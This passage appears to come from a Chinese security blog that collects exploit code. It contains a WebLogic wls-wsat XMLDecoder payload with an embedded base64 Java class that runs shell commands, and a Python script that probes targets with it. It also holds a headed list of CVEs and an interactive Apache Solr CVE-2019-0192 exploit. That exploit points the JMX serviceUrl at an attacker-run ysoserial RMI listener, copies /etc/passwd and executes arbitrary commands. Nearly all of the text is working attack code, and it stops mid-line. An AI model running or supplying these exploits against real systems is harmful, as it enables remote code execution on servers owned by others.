xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt; &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt; &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt; </span></span><br><span class="line"><span class="string">&lt;java&gt;</span></span><br><span class="line"><span class="string">&lt;class&gt;&lt;string&gt;org.slf4j.ext.EventData&lt;/string&gt;</span></span><br><span class="line"><span class="string">&lt;void&gt;</span></span><br><span class="line"><span class="string">&lt;string&gt;</span></span><br><span class="line"><span class="string">&lt;java&gt;</span></span><br><span class="line"><span class="string">&lt;void class="sun.misc.BASE64Decoder"&gt;</span></span><br><span class="line"><span class="string">&lt;void method="decodeBuffer" id="byte_arr"&gt;&lt;string&gt;yv66vgAAADIAYwoAFAA8CgA9AD4KAD0APwoAQABBBwBCCgAFAEMHAEQKAAcARQgARgoABwBHBwBICgALADwKAAsASQoACwBKCABLCgATAEwHAE0IAE4HAE8HAFABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExSZXN1bHRCYXNlRXhlYzsBAAhleGVjX2NtZAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAANmaXMBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAZyZXN1bHQBAA1TdGFja01hcFRhYmxlBwBRBwBSBwBTBwBCBwBEAQAKRXhjZXB0aW9ucwEAB2RvX2V4ZWMBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247BwBNBwBUAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAChSZXN1bHRCYXNlRXhlYy5qYXZhIGZyb20gSW5wdXRGaWxlT2JqZWN0DAAVABYHAFUMAFYAVwwAWABZBwBSDABaAFsBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAVAFwBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAVAF0BAAAMAF4AXwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABgAGEMAGIAXwEAC2NtZC5leGUgL2MgDAAcAB0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALL2Jpbi9zaCAtYyABAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABMAFAAAAAAABAABABUAFgABABcAAAAvAAEAAQAAAAUqtwABsQAAAAIAGAAAAAYAAQAAAAMAGQAAAAwAAQAAAAUAGgAbAAAACQAcAB0AAgAXAAAA+QADAAcAAABOuAACKrYAA0wrtgAETbsABVkstwAGTrsAB1kttwAIOgQBOgUSCToGGQS2AApZOgXGABy7AAtZtwAMGQa2AA0ZBbYADbYADjoGp//fGQawAAAAAwAYAAAAJgAJAAAABgAIAAcADQAIABYACQAgAAoAIwALACcADAAyAA4ASwARABkAAABIAAcAAABOAB4AHwAAAAgARgAgACEAAQANAEEAIgAjAAIAFgA4ACQAJQADACAALgAmACcABAAjACsAKAAfAAUAJwAnACkAHwAGACoAAAAfAAL/ACcABwcAKwcALAcALQcALgcALwcAKwcAKwAAIwAwAAAABAABABEACQAxAB0AAgAXAAAAqgACAAMAAAA3EglMuwALWbcADBIPtgANKrYADbYADrgAEEynABtNuwALWbcADBIStgANKrYADbYADrgAEEwrsAABAAMAGgAdABEAAwAYAAAAGgAGAAAAFgADABkAGgAeAB0AGwAeAB0ANQAfABkAAAAgAAMAHgAXADIAMwACAAAANwAeAB8AAAADADQAKQAfAAEAKgAAABMAAv8AHQACBwArBwArAAEHADQXADAAAAAEAAEANQAJADYANwACABcAAAArAAAAAQAAAAGxAAAAAgAYAAAABgABAAAANgAZAAAADAABAAAAAQA4ADkAAAAwAAAABAABADUAAQA6AAAAAgA7&lt;/string&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;void class="org.mozilla.classfile.DefiningClassLoader"&gt;</span></span><br><span class="line"><span class="string">&lt;void method="defineClass"&gt;</span></span><br><span class="line"><span class="string">&lt;string&gt;ResultBaseExec&lt;/string&gt;</span></span><br><span class="line"><span class="string">&lt;object idref="byte_arr"&gt;&lt;/object&gt;</span></span><br><span class="line"><span class="string">&lt;void method="newInstance"&gt;</span></span><br><span class="line"><span class="string">&lt;void method="do_exec" id="result"&gt;</span></span><br><span class="line"><span class="string">&lt;string&gt;echo lu^fei lu$1fei test&lt;/string&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;void class="java.lang.Thread" method="currentThread"&gt;</span></span><br><span class="line"><span class="string">&lt;void method="getCurrentWork" id="current_work"&gt;</span></span><br><span class="line"><span class="string">&lt;void method="getClass"&gt;</span></span><br><span class="line"><span class="string">&lt;void method="getDeclaredField"&gt;</span></span><br><span class="line"><span class="string">&lt;string&gt;connectionHandler&lt;/string&gt;</span></span><br><span class="line"><span class="string">&lt;void method="setAccessible"&gt;&lt;boolean&gt;true&lt;/boolean&gt;&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;void method="get"&gt;</span></span><br><span class="line"><span class="string">&lt;object idref="current_work"&gt;&lt;/object&gt;</span></span><br><span class="line"><span class="string">&lt;void method="getServletRequest"&gt;</span></span><br><span class="line"><span class="string">&lt;void method="getResponse"&gt;</span></span><br><span class="line"><span class="string">&lt;void method="getServletOutputStream"&gt;</span></span><br><span class="line"><span class="string">&lt;void method="writeStream"&gt;</span></span><br><span class="line"><span class="string">&lt;object class="weblogic.xml.util.StringInputStream"&gt;&lt;object idref="result"&gt;&lt;/object&gt;&lt;/object&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;void method="flush"/&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;void method="getWriter"&gt;&lt;void method="write"&gt;&lt;string&gt;&lt;/string&gt;&lt;/void&gt;&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;/java&gt;</span></span><br><span class="line"><span class="string">&lt;/string&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;/class&gt;</span></span><br><span class="line"><span class="string">&lt;/java&gt;</span></span><br><span class="line"><span class="string">&lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">&lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">'http'</span>:<span class="string">'http://127.0.0.1:4321'</span>,<span class="string">'https'</span>:<span class="string">'https://127.0.0.1:4321'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_url</span><span class="params">(url)</span>:</span></span><br><span class="line">    vul_url = url + <span class="string">'wls-wsat/CoordinatorPortType11'</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Content-Type'</span>:<span class="string">'text/xml'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0'</span>,</span><br><span class="line">        <span class="string">'SOAPAction'</span>:<span class="string">''</span>,</span><br><span class="line">        <span class="string">'lfcmd'</span>:<span class="string">'echo windowslu^fei linuxlu$1fei test'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># jdk7u21 命令回显</span></span><br><span class="line">    rsp = requests.post(vul_url, data=echo_cmd_payload_10_3_6, verify=<span class="literal">False</span>, headers=headers, proxies=proxies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"windowslufei"</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">        print(<span class="string">"[*]存在漏洞 echo_cmd_payload_10_0_3,在windows"</span>)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">"linuxlufei"</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">        print(<span class="string">"[*]存在漏洞 echo_cmd_payload_10_0_3,在linux"</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    rsp = requests.post(vul_url, data=echo_cmd_payload_10_3_6_2, verify=<span class="literal">False</span>, headers=headers, proxies=proxies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"windowslufei"</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">        print(<span class="string">"[*]存在漏洞 echo_cmd_payload_10_3_6.2,在windows"</span>)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">"linuxlufei"</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">        print(<span class="string">"[*]存在漏洞 echo_cmd_payload_10_3_6.2,在linux"</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># EventData</span></span><br><span class="line">    rsp = requests.post(vul_url, data=echo_cmd_payload_12_1_3, verify=<span class="literal">False</span>, headers=headers, proxies=proxies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"windowslufei"</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">        print(<span class="string">"[*]存在漏洞 echo_cmd_payload_12_1_3,在windows"</span>)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">"linuxlufei"</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">        print(<span class="string">"[*]存在漏洞 echo_cmd_payload_12_1_3,在linux"</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    url = url <span class="keyword">if</span> url[<span class="number">-1</span>]==<span class="string">'/'</span><span class="keyword">else</span> url + <span class="string">'/'</span></span><br><span class="line">    check_url(url)</span><br></pre></td></tr></table></figure><hr><h6 id="2019-05-14-Microsoft-Windows-远程桌面服务远程执行代码漏洞-CVE-2019-0708"><a href="#2019-05-14-Microsoft-Windows-远程桌面服务远程执行代码漏洞-CVE-2019-0708" class="headerlink" title="2019-05-14 Microsoft Windows 远程桌面服务远程执行代码漏洞(CVE-2019-0708)"></a>2019-05-14 Microsoft Windows 远程桌面服务远程执行代码漏洞(CVE-2019-0708)</h6><h6 id="2019-03-13-Apache-Solr-XXE-amp-RCE-漏洞-CVE-2017-12629"><a href="#2019-03-13-Apache-Solr-XXE-amp-RCE-漏洞-CVE-2017-12629" class="headerlink" title="2019-03-13 Apache Solr XXE &amp; RCE 漏洞(CVE-2017-12629)"></a>2019-03-13 Apache Solr XXE &amp; RCE 漏洞(CVE-2017-12629)</h6><h6 id="2019-03-13-Apache-Solr-JMX-远程代码执行漏洞-CVE-2019-0192"><a href="#2019-03-13-Apache-Solr-JMX-远程代码执行漏洞-CVE-2019-0192" class="headerlink" title="2019-03-13 Apache Solr JMX 远程代码执行漏洞(CVE-2019-0192)"></a>2019-03-13 Apache Solr JMX 远程代码执行漏洞(CVE-2019-0192)</h6><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">remote = <span class="string">"http://172.18.0.5:8983"</span></span><br><span class="line">ressource = <span class="string">""</span></span><br><span class="line">RHOST = <span class="string">"172.18.0.1"</span></span><br><span class="line">RPORT = <span class="string">"1099"</span></span><br><span class="line"></span><br><span class="line">proxy = &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(command)</span>:</span></span><br><span class="line">    print(<span class="string">"\n Run the malicious RMI server using yoserial by running this command:"</span>)</span><br><span class="line">    print(<span class="string">"\n java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener "</span> + RPORT + <span class="string">" Jdk7u21"</span> + command)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"\nCVE-2019-0192 - Apache Solr RCE 5.0.0 to 5.5.5 and 6.0.0 to 6.6.5\n"</span>)</span><br><span class="line">    print(<span class="string">"[+] Checking if ressource available =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">    burp0_url = remote + <span class="string">"/solr/admin/cores?wt=json"</span></span><br><span class="line">    r = requests.get(burp0_url, proxies=proxy, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> r.json()[<span class="string">'status'</span>] == <span class="string">""</span>:</span><br><span class="line">            print(<span class="string">"KO"</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a = list(r.json()[<span class="string">'status'</span>].keys())</span><br><span class="line">            ressource = <span class="string">"/solr/"</span> + a[<span class="number">0</span>] + <span class="string">"/config"</span></span><br><span class="line">            print(ressource)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"KO"</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            command = input(<span class="string">"command (\033[92mnot reflected\033[0m)&gt; "</span>)</span><br><span class="line">            <span class="keyword">if</span> command == <span class="string">"exit"</span>:</span><br><span class="line">                print(<span class="string">"Exiting..."</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            command = base64.b64encode(command.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            command_str = command.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            command_str = command_str.replace(<span class="string">'/'</span>, <span class="string">'+'</span>)</span><br><span class="line"></span><br><span class="line">            pro = subprocess.Popen(</span><br><span class="line">                <span class="string">"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener "</span> + RPORT + <span class="string">" Jdk7u21 'cp /etc/passwd /tmp/passwd'"</span>, stdout=subprocess.PIPE,shell=<span class="literal">True</span>, preexec_fn=os.setsid)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"[+] Copy file to tmp directory =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">            burp0_url = remote + ressource</span><br><span class="line">            burp0_headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">            burp0_json = &#123;</span><br><span class="line">                <span class="string">"set-property"</span>: &#123;<span class="string">"jmx.serviceUrl"</span>: <span class="string">"service:jmx:rmi:///jndi/rmi://"</span> + RHOST + <span class="string">":"</span> + RPORT + <span class="string">"/obj"</span>&#125;&#125;</span><br><span class="line">            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">500</span>:</span><br><span class="line">                m = re.search(<span class="string">'(undeclared checked exception; nested exception is)'</span>, r.text)</span><br><span class="line">                <span class="keyword">if</span> m:</span><br><span class="line">                    print(<span class="string">"\033[92mOK\033[0m"</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"\n[-] Error"</span>)</span><br><span class="line">                    os.killpg(os.getpgid(pro.pid), signal.SIGTERM)</span><br><span class="line">                    sys.exit()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"KO"</span>)</span><br><span class="line">                os.killpg(os.getpgid(pro.pid), signal.SIGTERM)</span><br><span class="line">                sys.exit()</span><br><span class="line">            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">            pro = subprocess.Popen(</span><br><span class="line">                <span class="string">"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener "</span> + RPORT + <span class="string">" Jdk7u21 'sed -i 1cpwn /tmp/passwd'"</span>, stdout=subprocess.PIPE, shell=<span class="literal">True</span>, preexec_fn=os.setsid)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"[+] Preparing file =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">            burp0_url = remote + ressource</span><br><span class="line">            burp0_headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">            burp0_json = &#123;</span><br><span class="line">                <span class="string">"set-property"</span>: &#123;<span class="string">"jmx.serviceUrl"</span>: <span class="string">"service:jmx:rmi:///jndi/rmi://"</span> + RHOST + <span class="string">":"</span> + RPORT + <span class="string">"/obj"</span>&#125;&#125;</span><br><span class="line">            r = requests.post(</span><br><span class="line">                burp0_url, headers=burp0_headers, json=burp0_json)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">500</span>:</span><br><span class="line">                print(<span class="string">"\033[92mOK\033[0m"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"KO"</span>)</span><br><span class="line">                os.killpg(os.getpgid(pro.pid), signal.SIGTERM)</span><br><span class="line">                sys.exit()</span><br><span class="line">            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">            pro = subprocess.Popen(</span><br><span class="line">                <span class="string">"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener "</span> + RPORT + <span class="string">" Jdk7u21 'sed -i /[^pwn]/d /tmp/passwd'"</span>, stdout=subprocess.PIPE, shell=<span class="literal">True</span>, preexec_fn=os.setsid)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"[+] Cleaning temp file =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">            burp0_url = remote + ressource</span><br><span class="line">            burp0_headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">            burp0_json = &#123;</span><br><span class="line">                <span class="string">"set-property"</span>: &#123;<span class="string">"jmx.serviceUrl"</span>: <span class="string">"service:jmx:rmi:///jndi/rmi://"</span> + RHOST + <span class="string">":"</span> + RPORT + <span class="string">"/obj"</span>&#125;&#125;</span><br><span class="line">            r = requests.post(</span><br><span class="line">                burp0_url, headers=burp0_headers, json=burp0_json)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">500</span>:</span><br><span class="line">                print(<span class="string">"\033[92mOK\033[0m"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"KO"</span>)</span><br><span class="line">                os.killpg(os.getpgid(pro.pid), signal.SIGTERM)</span><br><span class="line">                sys.exit()</span><br><span class="line">            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">            pro = subprocess.Popen(</span><br><span class="line">                <span class="string">"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener "</span> + RPORT + <span class="string">" Jdk7u21 'sed -i 1s/pwn/&#123;echo,"</span> +</span><br><span class="line">                command_str + <span class="string">"&#125;|&#123;base64,-d&#125;&gt;pwn.txt/g /tmp/passwd'"</span>, stdout=subprocess.PIPE, shell=<span class="literal">True</span>, preexec_fn=os.setsid)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"[+] Writing command into temp file =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">            burp0_url = remote + ressource</span><br><span class="line">            burp0_headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">            burp0_json = &#123;</span><br><span class="line">                <span class="string">"set-property"</span>: &#123;<span class="string">"jmx.serviceUrl"</span>: <span class="string">"service:jmx:rmi:///jndi/rmi://"</span> + RHOST + <span class="string">":"</span> + RPORT + <span class="string">"/obj"</span>&#125;&#125;</span><br><span class="line">            r = requests.post(</span><br><span class="line">                burp0_url, headers=burp0_headers, json=burp0_json)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">500</span>:</span><br><span class="line">                print(<span class="string">"\033[92mOK\033[0m"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"KO"</span>)</span><br><span class="line">                os.killpg(os.getpgid(pro.pid), signal.SIGTERM)</span><br><span class="line">                sys.exit()</span><br><span class="line">            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">            pro = subprocess.Popen(</span><br><span class="line">                <span class="string">"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener "</span> + RPORT + <span class="string">" Jdk7u21 'bash /tmp/passwd'"</span>, stdout=subprocess.PIPE, shell=<span class="literal">True</span>, preexec_fn=os.setsid)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"[+] Decode base64 command =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">            burp0_url = remote + ressource</span><br><span class="line">            burp0_headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">            burp0_json = &#123;</span><br><span class="line">                <span class="string">"set-property"</span>: &#123;<span class="string">"jmx.serviceUrl"</span>: <span class="string">"service:jmx:rmi:///jndi/rmi://"</span> + RHOST + <span class="string">":"</span> + RPORT + <span class="string">"/obj"</span>&#125;&#125;</span><br><span class="line">            r = requests.post(</span><br><span class="line">                burp0_url, headers=burp0_headers, json=burp0_json)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">500</span>:</span><br><span class="line">                print(<span class="string">"\033[92mOK\033[0m"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"KO"</span>)</span><br><span class="line">                os.killpg(os.getpgid(pro.pid), signal.SIGTERM)</span><br><span class="line">                sys.exit()</span><br><span class="line">            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">            pro = subprocess.Popen(</span><br><span class="line">                <span class="string">"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener "</span> + RPORT + <span class="string">" Jdk7u21 'bash pwn.txt'"</span>, stdout=subprocess.PIPE, shell=<span class="literal">True</span>, preexec_fn=os.setsid)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"[+] Executing command =&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">            burp0_url = remote + ressource</span><br><span class="line">            burp0_headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">            burp0_json = &#123;</span><br><span class="line">                <span class="string">"set-property"</span>: &#123;<span class="string">"jmx.serviceUrl"</span>: <span class="string">"service:jmx:rmi:///jndi/rmi://"</span> + RHOST + <span class="string">":"</span> + RPORT + <span class="string">"/obj"</span>&#125;&#125;</span><br><span class="line">            r = requests.post(</span><br><span class="line">                burp0_url, headers=burp0_headers, json=burp0_json)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">500</span>:</span><br><span class="line">                print(<span class="string">"\033[92mOK\033[0m"</span>)</span><br><span class="line">            <span 